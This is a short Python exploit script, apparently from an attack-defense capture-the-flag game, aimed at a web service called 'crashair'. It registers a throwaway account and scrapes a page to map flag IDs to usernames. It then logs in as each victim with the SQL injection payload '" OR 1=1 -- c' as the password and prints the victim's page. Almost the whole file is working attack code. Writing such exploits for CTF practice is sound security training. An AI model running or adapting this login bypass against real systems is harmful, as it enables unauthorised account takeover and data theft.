#!/usr/bin/env python3
import os
import sys
sys.path.insert(1, '../imports/')
sys.path.insert(1, 'imports/')

import utils
import requests
import json
from bs4 import BeautifulSoup
from pwn import *
import random
import string

# Use this function to print stuff to client
def log(message):
    print(message, flush=True)

IP_ADDRESS = sys.argv[1]
dir_path = os.path.dirname(os.path.realpath(__file__)) + '/../'
flag_ids = {}
with open(dir_path + 'flag_ids.json', 'r', encoding='utf-8') as f:
    flag_ids = json.loads(f.read())
    #log(flag_ids)

  
# Adjust if needed


# Adjust if needed
SERVICE = "crashair"
PORT = 8000
TARGET_URL = f'http://{IP_ADDRESS}:{PORT}'

valid_users = flag_ids.get(SERVICE, {}).get(IP_ADDRESS, [])


for num in valid_users:

    s = requests.Session()

    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    pwdlol = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    inj = '" OR 1=1 -- c'

    # login sql injection
    #payload = f"username={username}&password={inj}"
    
    payload = {
        'username': username,
        'password': pwdlol
    }
    login1 = s.post(TARGET_URL + "/register", data=payload)
    res = s.get(TARGET_URL + "/optionals")

    soup = BeautifulSoup(res.text, 'html.parser')

    exfiltreduser = None
    for tr in soup.find_all('tr'):
        my_num = tr.text.split()[0]
        if my_num == num:
            exfiltreduser = tr.text.split()[1]
            break
    if exfiltreduser is None:
        continue
    s = requests.Session()
    #flagged login
    payload2 = {
        'username': exfiltreduser,
        'password': inj
    }
    login2 = s.post(TARGET_URL + "/login", data=payload2)
    flagres = s.get(TARGET_URL + "/optionals")

    print(flagres.text)
